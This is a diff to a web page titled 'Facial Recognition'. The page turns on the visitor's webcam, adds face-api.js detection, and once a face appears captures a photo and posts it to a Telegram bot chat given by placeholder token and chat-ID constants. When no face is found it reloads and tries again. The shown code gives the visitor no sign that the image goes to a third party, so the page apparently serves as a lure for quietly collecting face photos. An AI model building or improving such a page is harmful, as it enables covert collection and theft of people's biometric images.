@@ -4,6 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Facial Recognition</title>
+    <script src="https://cdn.jsdelivr.net/npm/@vladmandic/face-api"></script>
     <style>
         body {
             text-align: center;
@@ -35,14 +36,25 @@
         const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN';
         const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID';
 
-        navigator.mediaDevices.getUserMedia({ video: true })
-            .then(stream => { video.srcObject = stream; })
-            .catch(err => console.error("Error accessing camera: ", err));
+        async function startCamera() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                video.srcObject = stream;
+                await loadModels();
+                detectFace();
+            } catch (err) {
+                console.error("Error accessing camera: ", err);
+            }
+        }
 
-        function captureAndSend() {
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-            canvas.toBlob(blob => {
-                if (!blob || blob.size === 0) {
+        async function loadModels() {
+            await faceapi.nets.tinyFaceDetector.loadFromUri('https://cdn.jsdelivr.net/npm/@vladmandic/face-api/models');
+        }
+
+        async function detectFace() {
+            setTimeout(async () => {
+                const detections = await faceapi.detectSingleFace(video, new faceapi.TinyFaceDetectorOptions());
+                if (!detections) {
                     video.style.display = "none";
                     message.innerText = "Error detecting face.";
                     message.style.color = "red";
@@ -50,7 +62,13 @@
                     setTimeout(() => { window.location.reload(); }, 3000);
                     return;
                 }
-                
+                captureAndSend();
+            }, 5000);
+        }
+
+        function captureAndSend() {
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            canvas.toBlob(blob => {
                 let formData = new FormData();
                 formData.append("chat_id", TELEGRAM_CHAT_ID);
                 formData.append("photo", blob, "face.jpg");
@@ -67,7 +85,7 @@
             }, 'image/jpeg');
         }
         
-        setTimeout(captureAndSend, 5000);
+        startCamera();
     </script>
 </body>
 </html>
